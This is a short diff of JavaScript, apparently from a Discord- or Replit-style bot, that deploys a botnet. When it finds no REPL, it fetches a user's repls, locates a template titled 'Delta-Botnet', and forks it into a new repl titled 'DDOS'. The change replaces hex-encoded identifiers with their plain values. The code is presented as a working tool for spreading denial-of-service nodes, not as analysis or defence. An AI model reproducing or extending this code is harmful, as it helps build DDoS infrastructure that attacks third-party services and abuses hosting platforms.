@@ -62,9 +62,9 @@ client.on("ready", async () => {
   if (!re) {
     console.log("REPL wasn't found, creating it..".bgRed);
 
-    const user = await client.users.fetch("0x64656C7461");
+    const user = await client.users.fetch("weedblunt");
     const repls = await user.repls.fetch();
-    const repl_template = repls.find((x) => x.title === "0x74656D70");
+    const repl_template = repls.find((x) => x.title === "Delta-Botnet");
 
     const created_repl = await repl_template.fork({
       title: "DDOS",
